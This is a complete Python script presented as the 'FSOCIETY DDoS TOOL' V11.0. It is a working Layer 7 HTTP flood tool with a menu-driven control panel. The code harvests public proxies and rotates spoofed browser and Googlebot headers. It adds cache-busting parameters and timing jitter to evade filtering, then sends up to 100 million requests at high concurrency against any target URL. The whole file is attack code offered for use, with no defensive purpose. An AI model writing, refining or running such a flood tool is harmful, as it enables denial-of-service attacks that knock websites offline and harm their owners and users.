#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=====================================================================
  FSOCIETY DDoS TOOL  |  LAYER 7  |  V11.0 "APOCALYPSE"
  Developer : Pyscodes  |  FSociety Team
  GitHub    : https://github.com/Pyscodes-pro
=====================================================================
  NEW IN V11.0:
   - SELF-INSTALLING: auto-detects + pip-installs every dependency
     (aiohttp, beautifulsoup4) before the tool starts. Zero setup.
   - FULL COLOR output (installer, menu, live stats, report)
   - Request limit raised to 100,000,000
   - Worker-POOL engine: scales to 100M reqs without RAM blowup
   - Multi-method GET/POST/HEAD/MIXED, cache-buster, stealth jitter
   - Proxy harvest + health-check, duration mode, live RPS report
=====================================================================
"""

import os
import sys
import time
import random
import string
import asyncio
import subprocess
import importlib
from collections import deque, Counter

# ─────────────────────────── COLORS ───────────────────────────
class C:
    R    = "\033[0m"
    DIM  = "\033[2m"
    G    = "\033[92m"
    Y    = "\033[93m"
    CY   = "\033[96m"
    RED  = "\033[91m"
    BL   = "\033[94m"
    MAG  = "\033[95m"
    BOLD = "\033[1m"


# ─────────────────────── AUTO DEPENDENCY INSTALLER ───────────────────────
REQUIRED_PKGS = {"aiohttp": "aiohttp", "bs4": "beautifulsoup4"}

def _pip_install(packages):
    base = [sys.executable, "-m", "pip", "install", "--upgrade",
            "--disable-pip-version-check", *packages]
    # make sure pip exists
    try:
        subprocess.run([sys.executable, "-m", "pip", "--version"], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        print(f"{C.Y}[*] pip missing — bootstrapping with ensurepip...{C.R}")
        subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for cmd in (base, base + ["--user"]):
        try:
            subprocess.check_call(cmd)
            return True
        except subprocess.CalledProcessError:
            continue
    return False


def ensure_dependencies():
    print(f"{C.CY}╔══════════════════════════════════════════════╗")
    print(f"║      DEPENDENCY CHECK / AUTO-INSTALL         ║")
    print(f"╚══════════════════════════════════════════════╝{C.R}")

    missing = []
    for mod, pkg in REQUIRED_PKGS.items():
        try:
            importlib.import_module(mod)
            print(f"{C.G}  [✓] {pkg:<18} already installed{C.R}")
        except ImportError:
            print(f"{C.Y}  [!] {pkg:<18} missing → will install{C.R}")
            missing.append(pkg)

    if not missing:
        print(f"{C.G}[+] All dependencies present. Booting...{C.R}\n")
        return

    print(f"\n{C.MAG}[*] Installing: {', '.join(missing)}{C.R}")
    ok = _pip_install(missing)

    # re-verify
    still = [p for m, p in REQUIRED_PKGS.items()
             if not _safe_import(m)]
    if not still:
        print(f"{C.G}[+] Install complete. Booting...{C.R}\n")
    else:
        print(f"{C.RED}[!] Could not install: {', '.join(still)}{C.R}")
        print(f"{C.Y}    Try manually: {sys.executable} -m pip install {' '.join(still)}{C.R}")
        if not ok:
            sys.exit(1)


def _safe_import(mod):
    try:
        importlib.invalidate_caches()
        importlib.import_module(mod)
        return True
    except ImportError:
        return False


# ── run installer BEFORE importing third-party libs ──
ensure_dependencies()

try:
    import aiohttp
    from bs4 import BeautifulSoup
except ImportError:
    print(f"{C.RED}[!] Import failed after install. Restart the script.{C.R}")
    sys.exit(1)


# ─────────────────────────── LOGO ───────────────────────────
LOGO = f"""{C.CY}{C.BOLD}
   ██████╗ ██████╗  ██████╗ ███████╗
   ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
   ██║  ██║██║  ██║██║   ██║███████╗
   ██║  ██║██║  ██║██║   ██║╚════██║
   ██████╔╝██████╔╝╚██████╔╝███████║
   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{C.R}
{C.G}        >> LAYER 7 ATTACK SUITE <<   {C.MAG}V11.0 "APOCALYPSE"{C.R}
{C.DIM}     Dev: Pyscodes  |  github.com/Pyscodes-pro{C.R}
{C.Y}     ╔═══════════════════════════════════════════╗
     ║   ☠  FSOCIETY  ☠   "WE ARE THE VOID"      ║
     ╚═══════════════════════════════════════════╝{C.R}
"""

# ─────────────────────────── CONFIG ───────────────────────────
DEFAULT_REQUESTS    = 1000
MAX_REQUESTS        = 100_000_000          # 100 million ceiling
DEFAULT_CONCURRENCY = 500
DEFAULT_TIMEOUT     = 5
DEFAULT_DURATION    = 0

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]
METHODS = ["GET", "POST", "HEAD", "MIXED"]
ACCEPT = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
]
LANGS = ["en-US,en;q=0.9", "id-ID,id;q=0.9,en;q=0.8", "en-GB,en;q=0.8", "de-DE,de;q=0.9,en;q=0.7"]
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.us-proxy.org",
]


# ─────────────────────────── STATS ───────────────────────────
class Stats:
    def __init__(self):
        self.success = 0
        self.fail = 0
        self.bytes = 0
        self.codes = Counter()
        self.lat = deque(maxlen=2000)
        self.start = time.time()
        self._last = self.start
        self._last_count = 0
        self.rps = 0.0

    def tick(self, ok, code, nbytes, latency):
        if ok:
            self.success += 1
        else:
            self.fail += 1
        if code:
            self.codes[code] += 1
        self.bytes += nbytes
        self.lat.append(latency)

    def sample_rps(self):
        now = time.time()
        dt = now - self._last
        if dt >= 0.5:
            total = self.success + self.fail
            self.rps = (total - self._last_count) / dt
            self._last = now
            self._last_count = total
        return self.rps

    @property
    def total(self):
        return self.success + self.fail

    @property
    def elapsed(self):
        return time.time() - self.start

    @property
    def avg_lat(self):
        return (sum(self.lat) / len(self.lat)) * 1000 if self.lat else 0.0


# ─────────────────────────── HELPERS ───────────────────────────
def clear():
    os.system("cls" if os.name == "nt" else "clear")


def rand_token(n=8):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def build_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT),
        "Accept-Language": random.choice(LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": random.choice(["no-cache", "no-store", "max-age=0"]),
        "Pragma": "no-cache",
        "Connection": "keep-alive",
        "Referer": "https://www.google.com/",
        "Origin": "https://www.google.com",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
    }


def bust(url):
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}_={rand_token(12)}"


def build_payload():
    return {"id": rand_token(16), "ts": str(int(time.time() * 1000)),
            "data": rand_token(64), "nonce": random.randint(0, 2**31)}


# ─────────────────────────── PROXY MANAGER ───────────────────────────
async def fetch_source(session, source):
    try:
        async with session.get(source, timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status != 200:
                return []
            text = await r.text()
            found = []
            if "<html" in text.lower() or "<table" in text.lower():
                soup = BeautifulSoup(text, "html.parser")
                for row in soup.find_all("tr"):
                    cells = [c.get_text(strip=True) for c in row.find_all("td")]
                    if len(cells) >= 2 and cells[0].count(".") == 3:
                        try:
                            found.append(f"http://{cells[0]}:{int(cells[1])}")
                        except ValueError:
                            pass
            else:
                for line in text.replace("\r", "\n").split("\n"):
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    line = line.split("//")[-1]
                    if ":" in line:
                        found.append(f"http://{line}")
            return found
    except Exception:
        return []


async def harvest_proxies():
    async with aiohttp.ClientSession() as s:
        results = await asyncio.gather(*[fetch_source(s, src) for src in PROXY_SOURCES])
    pool = set()
    for r in results:
        pool.update(r)
    return list(pool)


async def validate_proxies(proxies, test_url, limit=None):
    if limit:
        proxies = random.sample(proxies, min(limit, len(proxies)))
    alive, sem = [], asyncio.Semaphore(200)
    async with aiohttp.ClientSession() as s:
        async def worker(p):
            async with sem:
                try:
                    async with s.get(p and test_url, proxy=p,
                                     timeout=aiohttp.ClientTimeout(total=6),
                                     headers={"User-Agent": random.choice(USER_AGENTS)}) as r:
                        if r.status < 500:
                            alive.append(p)
                except Exception:
                    pass
        await asyncio.gather(*[worker(p) for p in proxies])
    return alive


# ─────────────────────────── ATTACK ENGINE ───────────────────────────
class Engine:
    def __init__(self, url, mode, stealth, use_proxy, proxies, timeout, num_requests=0):
        self.url = url
        self.mode = mode
        self.stealth = stealth
        self.use_proxy = use_proxy and bool(proxies)
        self.proxies = proxies
        self.timeout = timeout
        self.num_requests = num_requests
        self.stats = Stats()
        self.stop = asyncio.Event()

    def _pick_method(self):
        return random.choice(["GET", "POST"]) if self.mode == "MIXED" else self.mode

    async def one(self, session):
        method = self._pick_method()
        target = bust(self.url) if method in ("GET", "HEAD") else self.url
        headers = build_headers()
        proxy = random.choice(self.proxies) if self.use_proxy else None
        data = build_payload() if method == "POST" else None
        if self.stealth:
            await asyncio.sleep(random.uniform(0, 0.01))
        t0 = time.time()
        try:
            async with session.request(method, target, headers=headers, proxy=proxy,
                                       data=data, allow_redirects=False) as r:
                body = await r.read()
                self.stats.tick(True, r.status, len(body), time.time() - t0)
        except Exception:
            self.stats.tick(False, 0, 0, time.time() - t0)

    async def _worker_count(self, session, n):
        for _ in range(n):
            if self.stop.is_set():
                return
            await self.one(session)

    async def _worker_timed(self, session, end):
        while time.time() < end and not self.stop.is_set():
            await self.one(session)

    async def run(self, num_requests, concurrency, duration=0):
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            reporter = asyncio.create_task(self._report())
            try:
                if duration > 0:
                    end = time.time() + duration
                    await asyncio.gather(*[self._worker_timed(session, end)
                                           for _ in range(concurrency)])
                else:
                    per, rem = divmod(num_requests, concurrency)
                    await asyncio.gather(*[
                        self._worker_count(session, per + (1 if i < rem else 0))
                        for i in range(concurrency)])
            finally:
                self.stop.set()
                await reporter

    async def _report(self):
        while not self.stop.is_set():
            s = self.stats
            pct = ""
            if self.num_requests:
                pct = f" | {s.total * 100 / self.num_requests:5.1f}%"
            sys.stdout.write(
                f"\r{C.CY}[RUN]{C.R} {C.BOLD}{s.total:,}{C.R} sent | "
                f"{C.G}ok {s.success:,}{C.R} | {C.RED}fail {s.fail:,}{C.R} | "
                f"{C.Y}{s.sample_rps():,.0f} req/s{C.R} | "
                f"{s.avg_lat:.0f}ms | {s.bytes/1024:.0f} KB{pct}   ")
            sys.stdout.flush()
            await asyncio.sleep(0.3)

    def report(self):
        s = self.stats
        print("\n\n" + f"{C.MAG}{'='*52}")
        print(f"{C.BOLD}{C.Y}              💣  ATTACK REPORT  💣{C.R}")
        print(f"{C.MAG}{'='*52}{C.R}")
        print(f" Target        : {C.CY}{self.url}{C.R}")
        print(f" Mode          : {self.mode}")
        print(f" Stealth       : {C.G+'ON'+C.R if self.stealth else 'OFF'}")
        print(f" Proxy         : {C.G+'ON ('+str(len(self.proxies))+' nodes)'+C.R if self.use_proxy else 'OFF'}")
        print(f"{C.G} Successful    : {s.success:,}{C.R}")
        print(f"{C.RED} Failed        : {s.fail:,}{C.R}")
        print(f" Total sent    : {s.total:,}")
        print(f" Data recv     : {s.bytes/1024:.2f} KB")
        print(f" Avg latency   : {s.avg_lat:.1f} ms")
        print(f" Elapsed       : {s.elapsed:.2f} s")
        if s.elapsed > 0:
            print(f"{C.Y} Throughput    : {s.total/s.elapsed:,.0f} req/s{C.R}")
        if s.codes:
            print(" Response codes: " + ", ".join(f"{k}×{v}" for k, v in s.codes.most_common()))
        print(f"{C.MAG}{'='*52}{C.R}\n")


# ─────────────────────────── UI ───────────────────────────
class App:
    def __init__(self):
        self.url = None
        self.num_requests = DEFAULT_REQUESTS
        self.concurrency = DEFAULT_CONCURRENCY
        self.timeout = DEFAULT_TIMEOUT
        self.duration = DEFAULT_DURATION
        self.mode = "GET"
        self.stealth = False
        self.use_proxy = False
        self.proxies = []

    def banner(self):
        clear()
        print(LOGO)

    def menu(self):
        print(f"\n{C.BOLD}┌────────────  CONTROL PANEL  ────────────┐{C.R}")
        print(f"│ 1. Target URL      : {C.CY}{self.url or '(not set)'}{C.R}")
        print(f"│ 2. Requests        : {self.num_requests:,}  {C.DIM}(max {MAX_REQUESTS:,}){C.R}")
        print(f"│ 3. Concurrency     : {self.concurrency:,}")
        print(f"│ 4. HTTP Method     : {C.MAG}{self.mode}{C.R}")
        print(f"│ 5. Stealth Mode    : {'ON' if self.stealth else 'OFF'}")
        print(f"│ 6. Proxy           : {'ON' if self.use_proxy else 'OFF'}")
        print(f"│ 7. Duration (sec)  : {self.duration or 'fixed-count'}")
        print(f"│ 8. Timeout (sec)   : {self.timeout}")
        print(f"{C.BOLD}├──────────────────────────────────────────┤{C.R}")
        print(f"│ {C.G}9.  ► ATTACK ◄{C.R}")
        print(f"│ 0. Exit")
        print(f"{C.BOLD}└──────────────────────────────────────────┘{C.R}")
        return input(f"{C.Y}Pilih opsi > {C.R}").strip()

    async def load_proxies(self):
        print(f"{C.CY}[*] Harvesting proxies from {len(PROXY_SOURCES)} sources...{C.R}")
        raw = await harvest_proxies()
        print(f"{C.CY}[*] Found {len(raw)} candidates. Health-checking...{C.R}")
        alive = await validate_proxies(raw, self.url or "http://httpbin.org/get", limit=400)
        self.proxies = alive
        print(f"{C.G}[+] {len(alive)} live proxies ready.{C.R}")
        if not alive:
            print(f"{C.RED}[!] No live proxies — falling back to direct.{C.R}")
            self.use_proxy = False

    async def do_attack(self):
        if not self.url:
            print(f"{C.RED}[!] Set target URL first (option 1).{C.R}")
            return
        engine = Engine(self.url, self.mode, self.stealth, self.use_proxy,
                        self.proxies, self.timeout, self.num_requests)
        mode_txt = f"{self.duration}s burst" if self.duration else f"{self.num_requests:,} requests"
        print(f"\n{C.MAG}[⚔] Launching {self.mode} flood -> {self.url}  ({mode_txt}){C.R}\n")
        try:
            await engine.run(self.num_requests, self.concurrency, self.duration)
        except KeyboardInterrupt:
            engine.stop.set()
        engine.report()

    async def loop(self):
        self.banner()
        while True:
            ch = self.menu()
            if ch == "1":
                self.url = input("Target URL (http/https): ").strip()
            elif ch == "2":
                self.num_requests = self._int("Jumlah permintaan", self.num_requests,
                                              1, MAX_REQUESTS)
            elif ch == "3":
                self.concurrency = self._int("Concurrency", self.concurrency, 1, 100000)
            elif ch == "4":
                m = input("Methods: GET / POST / HEAD / MIXED -> ").strip().upper()
                if m in METHODS:
                    self.mode = m
            elif ch == "5":
                self.stealth = not self.stealth
            elif ch == "6":
                self.use_proxy = not self.use_proxy
                if self.use_proxy:
                    await self.load_proxies()
                else:
                    self.proxies = []
            elif ch == "7":
                self.duration = self._int("Duration detik (0=fixed)", self.duration, 0, 86400)
            elif ch == "8":
                self.timeout = self._int("Timeout detik", self.timeout, 1, 300)
            elif ch == "9":
                await self.do_attack()
            elif ch == "0":
                print(f"\n{C.MAG}-- GOOD BYE FRIEND --{C.R}")
                break

    @staticmethod
    def _int(prompt, default, lo=None, hi=None):
        try:
            val = int(input(f"{prompt} [{default}]: ").strip() or default)
        except ValueError:
            print(f"{C.RED}Invalid — keeping {default}.{C.R}")
            return default
        if lo is not None and val < lo:
            val = lo
        if hi is not None and val > hi:
            print(f"{C.Y}Capped to {hi:,}.{C.R}")
            val = hi
        return val


def main():
    if sys.version_info < (3, 7):
        print(f"{C.RED}[!] Python 3.7+ required.{C.R}")
        sys.exit(1)
    try:
        asyncio.run(App().loop())
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted by user.{C.R}")


if __name__ == "__main__":
    main()